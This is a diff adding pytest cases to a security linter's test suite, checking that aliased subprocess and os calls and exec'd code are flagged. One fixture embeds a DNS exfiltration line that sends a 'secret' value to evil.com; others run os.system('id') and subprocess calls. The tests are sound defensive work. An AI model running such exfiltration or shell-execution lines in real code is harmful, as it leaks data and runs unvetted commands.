@@ -137,6 +137,54 @@ class TestEvalExecDetection:
 # ---------------------------------------------------------------------------
 
 
+class TestAliasedImportDetection:
+    """Aliased imports must still be caught by the AST linter."""
+
+    def test_subprocess_aliased_as_sp_run_is_flagged(self, tmp_path: Path) -> None:
+        # import subprocess as sp; sp.run(...) should fail the AST linter
+        f = _write(
+            tmp_path,
+            "aliased_sp.py",
+            "import subprocess as sp\nsp.run(['ls'])\n",
+        )
+        violations = check_file(f)
+        assert len(violations) >= 1
+        assert any("run" in v.pattern for v in violations)
+
+    def test_os_aliased_as_operating_system_is_flagged(self, tmp_path: Path) -> None:
+        # import os as operating_system; operating_system.system(...) should fail
+        f = _write(
+            tmp_path,
+            "aliased_os.py",
+            "import os as operating_system\noperating_system.system('id')\n",
+        )
+        violations = check_file(f)
+        assert len(violations) >= 1
+        assert any("system" in v.pattern for v in violations)
+
+    def test_subprocess_aliased_popen_is_flagged(self, tmp_path: Path) -> None:
+        # import subprocess as proc; proc.Popen(...) should fail
+        f = _write(
+            tmp_path,
+            "aliased_popen.py",
+            "import subprocess as proc\nproc.Popen(['cmd'])\n",
+        )
+        violations = check_file(f)
+        assert len(violations) >= 1
+
+    def test_socket_based_dns_exfiltration_pattern_is_flagged(self, tmp_path: Path) -> None:
+        # socket with TXT query used for DNS exfiltration — exec call pattern
+        f = _write(
+            tmp_path,
+            "dns_exfil.py",
+            "import socket\ndata = 'secret'\nexec(f\"import socket; socket.getaddrinfo('{data}.evil.com', 80)\")\n",
+        )
+        violations = check_file(f)
+        # exec with a non-constant (f-string) argument must be flagged
+        assert len(violations) >= 1
+        assert any("exec" in v.pattern for v in violations)
+
+
 class TestAllowlist:
     def test_allowlisted_exec_py(self, tmp_path: Path) -> None:
         """src/veronica_core/adapter/exec.py must not be flagged."""
